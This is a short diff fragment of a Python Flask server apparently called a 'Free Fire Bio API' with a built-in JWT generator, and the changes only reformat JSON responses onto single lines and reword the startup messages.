-            "success": True,
-            "action": "CHECK PROFILE",
-            "data": result
-        })
+        return jsonify({"success": True, "action": "CHECK PROFILE", "data": result})
     else:
-        return jsonify({
-            "success": False,
-            "error": "Profile not found"
-        }), 404
+        return jsonify({"success": False, "error": "Profile not found"}), 404
 
 # ============ MAIN ============
 if __name__ == "__main__":
     print("=" * 60)
     print("🔥 FREE FIRE BIO API - AUTO JWT GENERATOR")
     print("=" * 60)
-    print(f"📱 JWT Generator: {'jwt_generator.py' if JWT_GENERATOR_AVAILABLE else 'Manual (fallback)'}")
-    print(f"🚀 Server running on http://0.0.0.0:5000")
+    print("📱 JWT Generator: Built-in (from jwt.py)")
+    print("🚀 Server running on http://0.0.0.0:5000")
     print("=" * 60)
     app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
